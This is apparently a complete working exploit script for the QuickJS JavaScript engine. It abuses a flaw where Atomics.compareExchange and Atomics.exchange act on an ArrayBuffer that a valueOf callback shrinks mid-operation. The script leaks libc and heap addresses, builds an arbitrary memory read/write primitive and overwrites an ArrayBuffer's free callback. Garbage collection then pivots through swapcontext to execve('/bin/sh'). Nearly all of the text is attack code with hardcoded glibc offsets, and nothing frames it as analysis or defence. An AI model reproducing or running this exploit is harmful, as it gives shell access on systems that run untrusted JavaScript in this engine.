import * as std from 'std';

// libc offsets (Debian glibc 2.41-12 in this environment)
const OFF_SWAPCONTEXT = 0x52b80n;
const OFF_EXECVE = 0xdddd0n;
const EXECVE_QWORD0 = 0x48050f0000003bb8n; // mov eax,59; syscall; ...

// ucontext_t offsets (x86_64)
const UCTX_RDI = 0x68;
const UCTX_RSI = 0x70;
const UCTX_RDX = 0x88;
const UCTX_RSP = 0xa0;
const UCTX_RIP = 0xa8;
const UCTX_EFL = 0xb0;
const UCTX_FPREGS_PTR = 0xe0;
const UCTX_FPREGS_MEM = 0x1a8;

// JSObject: JSObject.u.array.u.ptr overwrite location relative to the realloc tail
const TAIL_OFF = 0x20;
const JSOBJ_UPTR_OFF = 0x38;
const IDX_UPTR = (TAIL_OFF + JSOBJ_UPTR_OFF) / 8; // 11

let keep = [];

function warmup(buf) {
  // Cache shapes/constructors to reduce unpredictable allocations inside valueOf.
  keep.push(new BigUint64Array(buf));
  keep.push(new BigInt64Array(new ArrayBuffer(0x80)));
  keep.push(new Uint8Array(new ArrayBuffer(0x80)));
}

function drain_obj_bins() {
  // Drain any cached 0x60-ish chunks so the next JSObject alloc after a large free
  // tends to come from that large free chunk.
  for (let i = 0; i < 0x400; i++) keep.push({ x: i });
}

function leak_once_idx(idx) {
  let ab = new ArrayBuffer(0x5000, { maxByteLength: 0x5000 });
  let ta = new BigInt64Array(ab);
  // attempt to avoid "ab is top chunk" behavior
  let guard = new ArrayBuffer(0x2000);
  (new Uint8Array(guard))[0] = 0x41;
  let mal = {
    valueOf() {
      ab.resize(8);
      return 0n;
    }
  };
  return Atomics.compareExchange(ta, idx, mal, 0n);
}

function leak_high_ptr() {
  for (let i = 0; i < 50; i++) {
    let v = leak_once_idx(4);
    if (v !== 0n && (v >> 40n) === 0x7fn) return v;
    v = leak_once_idx(0);
    if (v !== 0n && (v >> 40n) === 0x7fn) return v;
  }
  throw new Error('no high ptr');
}

function make_scanner(base_ptr, backing_rab) {
  drain_obj_bins();
  let trig = new ArrayBuffer(0x1000, { maxByteLength: 0x1000 });
  let ta = new BigInt64Array(trig);
  let scanner;
  let mal = {
    valueOf() {
      trig.resize(8);
      scanner = new BigUint64Array(backing_rab); // length-tracking on RAB
      return base_ptr;
    }
  };
  Atomics.exchange(ta, IDX_UPTR, mal);
  return scanner;
}

function find_libc_base_from_ptr(ptr, scan_rab) {
  // Scan down within scan_rab window and validate by execve signature.
  let page = ptr & ~0xfffn;
  let base = page - (BigInt(scan_rab.byteLength) - 8n);
  let sc = make_scanner(base, scan_rab);
  for (let p = page; p >= base; p -= 0x1000n) {
    let idx = Number((p - base) / 8n);
    let q = sc[idx];
    if ((q & 0xffffffffn) !== 0x464c457fn) continue;
    let q0 = sc[Number(((p + OFF_EXECVE) - base) / 8n)];
    if (q0 === EXECVE_QWORD0) return p;
  }
  return 0n;
}

function find_libc_base() {
  // Use a dedicated scanning RAB to avoid huge address windows.
  let scan_rab = new ArrayBuffer(0x400000, { maxByteLength: 0x400000 }); // 4MB
  warmup(scan_rab);

  for (let i = 0; i < 40; i++) {
    let p = leak_high_ptr();
    let base = find_libc_base_from_ptr(p, scan_rab);
    if (base !== 0n) return base;
  }
  throw new Error('failed to find libc base');
}

function atomics_leak_heap_shift() {
  // Drain tcache for chunk size 0x400 (request 0x3f0) so remainder is first entry.
  for (let i = 0; i < 16; i++) keep.push(new ArrayBuffer(0x3f0));

  let ab = new ArrayBuffer(0x410, { maxByteLength: 0x410 });
  let ta = new BigInt64Array(ab);
  let mal = {
    valueOf() {
      ab.resize(8);
      return 0n;
    }
  };
  return Atomics.compareExchange(ta, 4, mal, 0n);
}

function leak_heap_anchor() {
  for (let i = 0; i < 20; i++) {
    let s = atomics_leak_heap_shift();
    let anchor = s << 12n;
    let hi = anchor >> 40n;
    if (anchor !== 0n && (hi === 0x55n || hi === 0x56n)) return anchor;
  }
  throw new Error('heap leak failed');
}

function main() {
  // 1) libc base (for swapcontext/execve)
  let libc_base = find_libc_base();
  let swapcontext = libc_base + OFF_SWAPCONTEXT;
  let execve = libc_base + OFF_EXECVE;

  // 2) prepare large heap space so scanning forward from our anchor won't segfault
  for (let i = 0; i < 220; i++) keep.push(new ArrayBuffer(0x10000));

  // 3) leak a heap anchor (tcache safe-linking next == NULL case)
  let heap_base = leak_heap_anchor();

  // 4) allocate our target ArrayBuffer AFTER the anchor so it likely sits above it
  const MARK = 0x1122334455667788n;
  let ropAb = new ArrayBuffer(0x4000);
  let dv = new DataView(ropAb);
  dv.setBigUint64(0, MARK, true);

  // 5) create a heap scanner with base at the leaked anchor
  let big_rab = new ArrayBuffer(0x2000000, { maxByteLength: 0x2000000 }); // 32MB
  warmup(big_rab);
  let heap_sc = make_scanner(heap_base, big_rab);

  // 6) scan forward for marker
  let data_ptr = 0n;
  const scan_qwords = 0x1000000 / 8; // scan 16MB
  for (let i = 0; i < scan_qwords; i++) {
    if (heap_sc[i] === MARK) {
      data_ptr = heap_base + 8n * BigInt(i);
      break;
    }
  }
  if (data_ptr === 0n) throw new Error('marker not found');

  // 7) locate JSArrayBuffer struct by searching for data_ptr pointer
  let abuf_ptr = 0n;
  const hdr_expect = 0xffffffff00004000n;
  for (let i = 0; i < scan_qwords; i++) {
    if (heap_sc[i] === data_ptr) {
      let cand = heap_base + 8n * BigInt(i) - 0x10n;
      let hdr = heap_sc[Number((cand - heap_base) / 8n)];
      if (hdr === hdr_expect) {
        abuf_ptr = cand;
        break;
      }
    }
  }
  if (abuf_ptr === 0n) throw new Error('JSArrayBuffer struct not found');

  // 8) craft ucontext in ropAb data
  const OFF_UCTX = 0x100;
  const OFF_ARGV = 0x200;
  const OFF_BINSH = 0x300;
  const OFF_STACK = 0x800;

  let uctx_ptr = data_ptr + BigInt(OFF_UCTX);
  let argv_ptr = data_ptr + BigInt(OFF_ARGV);
  let binsh_ptr = data_ptr + BigInt(OFF_BINSH);
  let stack_ptr = (data_ptr + BigInt(OFF_STACK) + 0xfn) & ~0xfn;

  dv.setBigUint64(OFF_ARGV + 0, binsh_ptr, true);
  dv.setBigUint64(OFF_ARGV + 8, 0n, true);
  const s = "/bin/sh\0";
  for (let i = 0; i < s.length; i++) dv.setUint8(OFF_BINSH + i, s.charCodeAt(i));

  dv.setBigUint64(OFF_UCTX + UCTX_RDI, binsh_ptr, true);
  dv.setBigUint64(OFF_UCTX + UCTX_RSI, argv_ptr, true);
  dv.setBigUint64(OFF_UCTX + UCTX_RDX, 0n, true);
  dv.setBigUint64(OFF_UCTX + UCTX_RSP, stack_ptr, true);
  dv.setBigUint64(OFF_UCTX + UCTX_RIP, execve, true);
  dv.setBigUint64(OFF_UCTX + UCTX_EFL, 0x202n, true);
  dv.setBigUint64(OFF_UCTX + UCTX_FPREGS_PTR, uctx_ptr + BigInt(UCTX_FPREGS_MEM), true);

  // 9) overwrite ropAb JSArrayBuffer fields: opaque and free_func
  let idx_opaque = Number(((abuf_ptr + 0x28n) - heap_base) / 8n);
  let idx_free_func = Number(((abuf_ptr + 0x30n) - heap_base) / 8n);
  heap_sc[idx_opaque] = uctx_ptr;
  heap_sc[idx_free_func] = swapcontext;

  // 10) trigger free
  ropAb = null;
  dv = null;
  std.gc();
  std.gc();

  print('FAIL');
}

main();
